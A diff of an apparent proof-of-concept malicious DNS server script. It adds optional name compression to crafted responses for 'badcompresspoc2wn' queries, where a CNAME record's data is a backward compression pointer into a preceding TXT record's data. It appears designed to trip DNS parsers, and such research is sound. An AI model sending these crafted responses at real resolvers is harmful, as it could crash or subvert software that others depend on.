@@ -17,14 +17,16 @@ if req.first_subdomain.startswith("badcompresspoc2wn"):
    ### ANSWER SECTION ########
    databin = b"\x0a\x04abcd\x03com\x00"
    # TXT            ~~~ CNAME points here
-   buffer += convDom2Bin(req.full_domain) + getTypeBin("TXT") + getClassBin("IN")
+   buffer += b'\xc0\x0c' if resp.compress else convDom2Bin(req.full_domain)
+   buffer += getTypeBin("TXT") + getClassBin("IN")
    buffer += struct.pack(">L", resp.TTL)            ## TTL
    buffer += struct.pack(">H", len(databin))        ## Data length
    buffer += databin
    # CNAME
    offset_to_the_txt = (len(req.full_domain)*2) + 18 + 13 ## backward pointer to the previous TXT record
    databin = b"\xc0" + struct.pack(">B", offset_to_the_txt)
-   buffer += convDom2Bin(req.full_domain) + getTypeBin("CNAME") + getClassBin("IN")
+   buffer += b'\xc0\x0c' if resp.compress else convDom2Bin(req.full_domain)
+   buffer += getTypeBin("CNAME") + getClassBin("IN")
    buffer += struct.pack(">L", resp.TTL)            ## TTL
    buffer += struct.pack(">H", len(databin))        ## Data length
    buffer += databin
